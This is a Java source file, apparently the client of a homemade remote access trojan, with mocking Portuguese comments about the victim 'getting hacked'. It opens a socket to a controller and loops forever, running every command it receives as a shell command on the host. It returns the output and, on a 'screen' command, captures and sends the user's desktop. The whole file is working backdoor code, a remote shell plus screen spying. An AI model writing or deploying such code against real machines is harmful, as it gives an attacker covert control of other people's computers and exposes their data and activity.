import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.net.Socket;
import java.util.Objects;
import java.util.Scanner;

public class Client {
    static Connection connection;

    public static void main(String[] args) {
        try {
            System.out.println("Opa ta na hora de ser haskiado");
            connection = new Connection(new Socket("localhost", 27015));

            OsCheck.OSType ostype = OsCheck.getOperatingSystemType();
            switch (ostype) {
                case Windows:
                    windowsHandler();
                    break;
                case MacOS:
                    unixHandler();
                    break;
                case Linux:
                    unixHandler();
                    break;
                case Other:
                    unixHandler();
                    break;
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    static void windowsHandler() throws Exception {
        System.out.println("Hm safadinho ta no uindous do biu gayts neh kk");
        Runtime.getRuntime().exec("cmd /c cd C:\\");
        while (true) {
            String command = connection.readMessage().getCommand();

            if (Objects.equals(command, "screen")) { // neguin pediu screenshot
                sendScreenshot();
            } else {
                Process process = Runtime.getRuntime().exec("cmd /c" + command);
                Scanner respostaDoComando = new Scanner(process.getInputStream());


                StringBuilder response = new StringBuilder();
                while (respostaDoComando.hasNext()) {
                    response.append(respostaDoComando.nextLine() + "\n");
                }
                connection.sendMessage(new Message(response.toString()));
            }
        }
    }

    static void unixHandler() throws Exception {
        System.out.println("Hm safadinho ta usando uns uniks heim kk q developer vc");
        while (true) {
            String command = connection.readMessage().getCommand();

            if (Objects.equals(command, "screen")) { // neguin pediu screenshot
                sendScreenshot();
            } else {
                Process proc = Runtime.getRuntime().exec(command);
                Scanner respostaDoComando = new Scanner(proc.getInputStream());


                StringBuilder response = new StringBuilder();
                while (respostaDoComando.hasNext()) {
                    response.append(respostaDoComando.nextLine() + "\n");
                }
                connection.sendMessage(new Message(response.toString()));
            }
        }
    }

    private static void sendScreenshot() throws AWTException, IOException {
        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage screenshot = new Robot().createScreenCapture(screenRect);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ImageIO.write( screenshot, "jpg", baos );
        baos.flush();
        byte[] imageBytes = baos.toByteArray();
        baos.close();

        connection.sendMessage(new Message("screen", imageBytes));
    }
}
